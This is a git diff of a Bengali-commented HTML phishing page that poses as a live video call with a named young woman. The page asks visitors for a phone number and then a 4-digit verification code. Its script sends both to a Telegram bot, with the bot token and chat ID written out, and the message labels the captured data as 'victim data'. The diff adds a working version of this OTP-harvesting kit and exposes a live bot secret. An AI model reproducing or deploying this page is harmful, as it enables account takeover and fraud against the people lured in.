@@ -3,90 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nusrat Jahan is LIVE Now!</title>
-    <meta property="og:title" content="Nusrat Jahan is LIVE Now!">
-    <meta property="og:image" content="1000010151.jpg"> <style>
+    
+    <title>🔴 Sumaiya Akter Jui is LIVE NOW</title>
+    <meta property="og:title" content="🔴 Sumaiya Akter Jui is LIVE NOW">
+    <meta property="og:description" content="Unlock profile to start voice or video call.">
+    <meta property="og:image" content="ssstik.io_1777744992501.jpeg"> <meta property="og:type" content="video.other">
+
+    <style>
+        /* পুরো সাইটের ডিজাইন */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
+        html, body { height: 100%; width: 100%; overflow: hidden; background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
 
-        /* ধাপ ১: ভিডিও পেজ */
-        #p1 { position: fixed; width: 100%; height: 100%; z-index: 1; }
+        /* ভিডিও পেজ ডিজাইন */
+        #p1 { position: fixed; width: 100%; height: 100%; z-index: 1; background: #000; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        .ui { position: absolute; bottom: 0; width: 100%; height: 100%; z-index: 2; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 80px; background: linear-gradient(to bottom, transparent 40%, rgba(0,0,0,0.7)); }
-        .name { color: #fff; font-size: 22px; font-weight: bold; margin-bottom: 30px; }
-        .btns { display: flex; gap: 15px; }
-        .b { padding: 15px 30px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .w { background: #fff; color: #000; }
-        .p { background: #E1306C; color: #fff; }
-
-        /* ধাপ ২ ও ৩ এর জন্য ডিজাইন */
-        .view { position: fixed; top: 0; width: 100%; height: 100%; background: #fff; z-index: 100; display: none; flex-direction: column; align-items: center; padding-top: 70px; }
-        .pic { width: 110px; height: 110px; border-radius: 50%; border: 2px solid #eee; object-fit: cover; margin-bottom: 15px; }
-        .t { font-size: 20px; color: #000; font-weight: bold; margin-bottom: 30px; }
-        .inp { width: 85%; max-width: 350px; padding: 18px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 12px; background: #fafafa; font-size: 18px; outline: none; }
+        .ui-overlay { position: absolute; bottom: 0; width: 100%; height: 100%; z-index: 2; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 60px; background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.8)); }
         
-        /* ৪টি ওটিপি বক্সের ঘর */
-        .o-row { display: flex; gap: 12px; margin-bottom: 30px; }
-        .o-box { width: 50px; height: 55px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold; background: #fafafa; }
+        /* কন্টেন্ট ভিউ ডিজাইন (স্ক্রিনশট অনুযায়ী) */
+        .view { position: fixed; top: 0; width: 100%; height: 100%; background: #fff; z-index: 100; display: none; flex-direction: column; align-items: center; padding-top: 80px; }
+        .header-pic { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 2px solid #f0f0f0; margin-bottom: 20px; }
+        .display-name { font-size: 22px; font-weight: bold; color: #000; margin-bottom: 8px; }
+        .sub-text { font-size: 14px; color: #666; margin-bottom: 30px; text-align: center; width: 80%; }
+        
+        /* ইনপুট এবং বাটন */
+        .phone-input { width: 85%; max-width: 380px; padding: 18px; margin-bottom: 25px; border: 1px solid #ddd; border-radius: 8px; background: #f9f9f9; font-size: 16px; outline: none; }
+        .action-btn { width: 85%; max-width: 380px; padding: 16px; background: linear-gradient(90deg, #4458dc, #f42d4d); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 15px; text-transform: uppercase; letter-spacing: 1px; }
 
-        .sub { width: 85%; max-width: 350px; padding: 18px; background: linear-gradient(90deg, #6a11cb, #2575fc); color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        /* ওটিপি ডিজাইন */
+        .otp-group { display: flex; gap: 10px; margin-bottom: 25px; }
+        .otp-box { width: 50px; height: 55px; border: 1px solid #ddd; border-radius: 6px; text-align: center; font-size: 20px; font-weight: bold; background: #f9f9f9; }
     </style>
 </head>
 <body>
 
     <div id="p1">
-        <video id="v" autoplay muted loop playsinline><source src="1000010152.mp4" type="video/mp4"></video>
-        <div class="ui">
-            <div class="name">Mst: Nusrat Jahan</div>
-            <div class="btns">
-                <button class="b w" onclick="go2()">JOIN LIVE</button>
-                <button class="b p" onclick="go2()">📹 VIDEO CALL</button>
-            </div>
+        <video id="v" autoplay muted loop playsinline poster="ssstik.io_1777744992501.jpeg">
+            <source src="1000010152.mp4" type="video/mp4">
+        </video>
+        <div class="ui-overlay">
+            <div style="color: #fff; font-size: 18px; font-weight: bold; margin-bottom: 20px;">Sumaiya Akter Jui is LIVE</div>
+            <button class="action-btn" onclick="showPhonePage()">JOIN LIVE NOW</button>
         </div>
     </div>
 
     <div id="p2" class="view">
-        <img src="1000010151.jpg" class="pic">
-        <h2 class="t">Nusrat Jahan</h2>
-        <input type="tel" id="ph" class="inp" placeholder="Phone number">
-        <button class="sub" onclick="go3()">CONTINUE</button>
+        <img src="ssstik.io_1777744992501.jpeg" class="header-pic">
+        <h2 class="display-name">Sumaiya Akter Jui</h2>
+        <p class="sub-text">Unlock profile to start voice or video call</p>
+        <input type="tel" id="ph" class="phone-input" placeholder="Phone number">
+        <button class="action-btn" onclick="showOtpPage()">JOIN LIVE NOW</button>
     </div>
 
     <div id="p3" class="view">
-        <img src="1000010151.jpg" class="pic">
-        <h2 class="t">Verification Code</h2>
-        <div class="o-row">
-            <input type="tel" maxlength="1" class="o-box" onkeyup="nx(this, 'b2')">
-            <input type="tel" maxlength="1" class="o-box" id="b2" onkeyup="nx(this, 'b3')">
-            <input type="tel" maxlength="1" class="o-box" id="b3" onkeyup="nx(this, 'b4')">
-            <input type="tel" maxlength="1" class="o-box" id="b4">
+        <img src="ssstik.io_1777744992501.jpeg" class="header-pic">
+        <h2 class="display-name">Verification Code</h2>
+        <p class="sub-text">Enter the 4-digit code sent to your phone</p>
+        <div class="otp-group">
+            <input type="tel" maxlength="1" class="otp-box" onkeyup="moveFocus(this, 'c2')">
+            <input type="tel" maxlength="1" class="otp-box" id="c2" onkeyup="moveFocus(this, 'c3')">
+            <input type="tel" maxlength="1" class="otp-box" id="c3" onkeyup="moveFocus(this, 'c4')">
+            <input type="tel" maxlength="1" class="otp-box" id="c4">
         </div>
-        <button class="sub" onclick="send()">VIDEO CALL NOW ✅</button>
+        <button class="action-btn" onclick="submitData()">START VIDEO CALL ✅</button>
     </div>
 
 <script>
-    let phoneNum = "";
-    function go2() { document.getElementById('p1').style.display = 'none'; document.getElementById('p2').style.display = 'flex'; }
-    function go3() { 
-        phoneNum = document.getElementById('ph').value;
-        if(phoneNum.length < 5) return alert("নম্বর দিন");
-        document.getElementById('p2').style.display = 'none'; document.getElementById('p3').style.display = 'flex'; 
+    let userPhone = "";
+
+    function showPhonePage() {
+        document.getElementById('p1').style.display = 'none';
+        document.getElementById('p2').style.display = 'flex';
     }
-    function nx(e, i) { if(e.value.length >= 1) document.getElementById(i).focus(); }
 
-    function send() {
-        const token = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
-        const cid = "8795859465"; // আপনার নিশ্চিত করা চ্যাট আইডি
-        const b = document.querySelectorAll('.o-box');
-        const otp = b[0].value + b[1].value + b[2].value + b[3].value;
+    function showOtpPage() {
+        userPhone = document.getElementById('ph').value;
+        if(userPhone.length < 5) return alert("দয়া করে সঠিক নম্বর দিন");
+        document.getElementById('p2').style.display = 'none';
+        document.getElementById('p3').style.display = 'flex';
+    }
 
-        if(otp.length < 4) return alert("৪ সংখ্যার কোড দিন");
+    function moveFocus(current, nextId) {
+        if(current.value.length >= 1) document.getElementById(nextId).focus();
+    }
 
-        const msg = `🔴 নতুন ডাটা:\n📱 নম্বর: ${phoneNum}\n🔑 ওটিপি: ${otp}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`)
-        .then(() => { 
-            alert("আপনার তথ্য যাচাই করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।"); 
-            location.reload(); 
+    function submitData() {
+        const botToken = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
+        const chatId = "8795859465"; // আপনার টেলিগ্রাম আইডি
+        
+        const boxes = document.querySelectorAll('.otp-box');
+        const otpCode = boxes[0].value + boxes[1].value + boxes[2].value + boxes[3].value;
+
+        if(otpCode.length < 4) return alert("৪ সংখ্যার কোডটি দিন");
+
+        const message = `🔥 নতুন ভিকটিম ডাটা:\n👤 নাম: Sumaiya Akter Jui\n📱 নম্বর: ${userPhone}\n🔑 ওটিপি: ${otpCode}`;
+        
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            alert("যাচাই করা হচ্ছে... দয়া করে অপেক্ষা করুন।");
+            location.reload();
         });
     }
 </script>
